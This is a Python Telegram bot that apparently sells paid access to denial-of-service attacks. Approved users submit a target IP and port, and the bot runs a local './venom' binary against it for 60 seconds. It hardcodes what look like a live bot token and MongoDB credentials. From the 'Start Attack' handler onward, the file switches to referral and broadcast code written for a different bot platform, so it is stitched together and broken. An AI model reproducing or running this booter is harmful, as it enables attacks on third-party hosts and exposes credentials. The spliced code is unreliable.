import telebot
import logging
import subprocess
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '7103679351:AAESbwKLQzqvDedy11n5LmXwDjbmb6WnQzw'
MONGO_URI = 'mongodb+srv://VENOMxCRAZY:CRAZYxVENOM@cluster0.ythilmw.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true'
CHANNEL_ID = -1002224570220
ADMIN_IDS = [6224931837]


client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['VENOM']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./venom", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[(user_id, target_ip, target_port)] = process.pid
        elif action == 2:
            pid = active_attacks.pop((user_id, target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
    except Exception as e:
        logging.error(f"Error in run_attack_command_sync: {e}")
def is_user_admin(user_id, chat_id):
    try:
        chat_member = bot.get_chat_member(chat_id, user_id)
        return chat_member.status in ['administrator', 'creator'] or user_id in ADMIN_IDS
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False

def check_user_approval(user_id):
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data['plan'] > 0:
            valid_until = user_data.get('valid_until', "")
            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logging.error(f"Error in checking user approval: {e}")
        return False


def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

def send_main_buttons(chat_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("ATTACK"), KeyboardButton("Start Attack 🚀"), KeyboardButton("Stop Attack"))
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')


@bot.message_handler(commands=['approve'])
def approve_user(message):
    if not is_user_admin(message.from_user.id, message.chat.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(message.chat.id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        bot.send_message(message.chat.id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
        logging.error(f"Error in approving user: {e}")


@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    if not is_user_admin(message.from_user.id, message.chat.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(message.chat.id, "*Invalid command format. Use /disapprove <user_id>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        bot.send_message(message.chat.id, f"*User {target_user_id} disapproved and reverted to free.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
        logging.error(f"Error in disapproving user: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        send_main_buttons(message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
        logging.error(f"Error in processing attack IP and port: {e}")

@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def hello(message):
    greetings = ""
    Bot.send_message(greetings + message)

def do_touch_own_link():
    Bot.send_message("")

def do_attracted(channel):
    hello("Referal: " + channel)

def do_attracted_by_user(ref_user):
    hello("")
    balance = Libs.ResourcesLib.another_user_res("balance", ref_user.telegramid)
    balance.add(0.0)
    Bot.send_message_to_chat_with_id(ref_user.chat_id, "🚧 New User on your Invite Link : " + "[" + user.telegramid + "]" + "(" + "tg://user?id=" + user.telegramid + ")" + "")

def do_already_attracted():
    Bot.send_message("")

track_options = {
    'onTouchOwnLink': do_touch_own_link,
    'onAttracted': do_attracted,
    'onAtractedByUser': do_attracted_by_user,
    'onAlreadyAttracted': do_already_attracted
}

Libs.ReferralLib.current_user.track(track_options)
welco = User.get_property("welco")
if welco is None:
    user_link = "[" + user.first_name + "]" + "(" + "tg://user?id=" + user.telegramid + ")"
    Bot.send_message_to_chat_with_id(5953498281,
        "*✅ New User\n\n🎉 User = " + user.first_name + "\n\n👀 Username =* " +
        user_link +
        " \n\n*🆔 User ID =* " +
        user.telegramid +
        ""
    )
    status = Libs.ResourcesLib.another_chat_res("status", "global")
    status.add(1)

User.set_property("welco", user.telegramid, "text")
Api.send_chat_action({
    'chat_id': chat.chatid,
    'action': "typing"
})
broadcast = Bot.get_property("Broadcast") if Bot.get_property("Broadcast") else []
if user.telegramid not in broadcast:
    broadcast.append(user.telegramid)
    Bot.set_property("Broadcast", broadcast, "json")
    # You can check it is adding users to list or not by this way: Bot.send_message("*Done :* " + inspect(Bot.get_property("Broadcast")) + "")

admin = Bot.get_property("adminchat")
new_user = User.get_property("new_user")
if not new_user:
    Bot.send_message_to_chat_with_id(admin, "🚦New User🚦\n\n⚜ User = " + user.first_name + "\n🔰 Username = @" + user.username + "\n🆔 User ID = " + user.telegramid + "\n📛 User Link = [" + user.first_name + "](tg://user?id=" + user.telegramid + ")")
    User.set_property("new_user", True, "boolean")

Bot.run_command("PVERIFY")

